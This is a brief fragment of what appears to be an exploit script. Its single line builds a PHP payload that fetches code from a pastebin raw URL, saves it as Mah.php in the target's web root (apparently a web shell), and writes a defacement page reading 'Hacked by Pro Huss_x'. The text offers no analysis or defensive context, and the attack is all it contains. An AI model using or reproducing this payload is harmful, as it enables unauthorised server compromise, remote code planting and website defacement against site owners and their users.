...
pl = generate_payload("fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Mah.php','w+'),file_get_contents('http://pastebin.com/raw/pYetDreV')); fwrite(fopen($_SERVER['DOCUMENT_ROOT'].'/Mah.htm','w+'),'Hacked by Pro Huss_x');")
